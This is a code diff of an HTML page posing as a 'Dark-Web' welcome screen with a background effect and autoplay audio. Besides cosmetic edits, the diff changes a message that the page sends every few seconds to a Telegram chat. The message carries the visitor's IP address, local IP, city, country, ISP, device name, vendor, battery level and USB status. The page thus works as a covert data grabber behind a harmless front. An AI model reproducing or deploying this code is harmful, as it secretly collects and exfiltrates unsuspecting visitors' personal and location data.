@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            background-color: #0d1117;
+            background-color: #0d1100;
             overflow: hidden;
         }
         canvas {
@@ -22,13 +22,13 @@
     <canvas id="canvas"></canvas>
     <div class="bg-black p-8 rounded-lg shadow-lg w-80 relative z-10">
         <div class="flex justify-center mb-6">
-            <div class="border border-gray-500 p-4 rounded-full">
-                <span class="text-white text-4xl">⳻Ｄａｒｋ - Ｗｅｂ༊</span>
+            <div class="border border-gray-500 p-2 rounded-full">
+                <span class="text-white text-2xl">𝘋𝘈𝘙𝘒--𝘋</span>
             </div>
         </div>
         <div class="text-center text-gray-400">
             <p class="mb-4">Welcome to the My Server. Click Background And Enjoy Effect!</p>
-            <p>Hello dear I'm DARK-D699</p>
+            <p>Hello dear I'm DXARK-D699</p>
         </div>
         <audio id="audio" autoplay>
             <source src="https://cdn.glitch.global/b81484d9-692a-4a73-b45b-1fea3c3bcb05/HI_HI_HA_HA!(256k).mp3?v=1739729489116" type="audio/mpeg">
@@ -159,7 +159,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: telegramChatId,
-                            text: `〄ＤＡＲＫ－Ｄ699 ايڪـͬــͤــᷜــͨــͣــͪـي　⎙\n\n𝙸𝚙 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: ${ipAddress}\n𝙻𝚘𝚌𝚊𝚕 𝙸𝚙: ${localIp}\n𝙲𝚘𝚞𝚗𝚝𝚛𝚢: ${country}\n𝚁𝚎𝚐𝚒𝚘𝚗: ${region}\n𝙲𝚒𝚝𝚢: ${city}\nIPS: ${isp}\n𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: ${language}\n𝚃𝚒𝚖𝚎: ${time}\n𝙳𝚎𝚟𝚒𝚌𝚎 𝙸𝚗𝚏𝚘: ${deviceName}\n\n𝚅𝚎𝚗𝚍𝚘𝚛: ${vendor}\n 𝙱𝚊𝚝𝚝𝚛𝚢: ${batteryLevel}\nUSB Connected: ${usbConnected} \n\nＭＡＤＥ　ＢＹ：@t.me/Dark_o_Gang `
+                            text: `〄　ＤＡＲＫ－Ｄ699　⎙\n\n𝙸𝚙 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: ${ipAddress}\n𝙻𝚘𝚌𝚊𝚕 𝙸𝚙: ${localIp}\n𝙲𝚘𝚞𝚗𝚝𝚛𝚢: ${country}\n𝚁𝚎𝚐𝚒𝚘𝚗: ${region}\n𝙲𝚒𝚝𝚢: ${city}\nIPS: ${isp}\n𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: ${language}\n𝚃𝚒𝚖𝚎: ${time}\n𝙳𝚎𝚟𝚒𝚌𝚎 𝙸𝚗𝚏𝚘: ${deviceName}\n\n𝚅𝚎𝚗𝚍𝚘𝚛: ${vendor}\n 𝙱𝚊𝚝𝚝𝚛𝚢: ${batteryLevel}\nUSB Connected: ${usbConnected} \n\nＭＡＤＥ　ＢＹ：@Dark_d699 `
                         })
                     });
                 }, 5000);
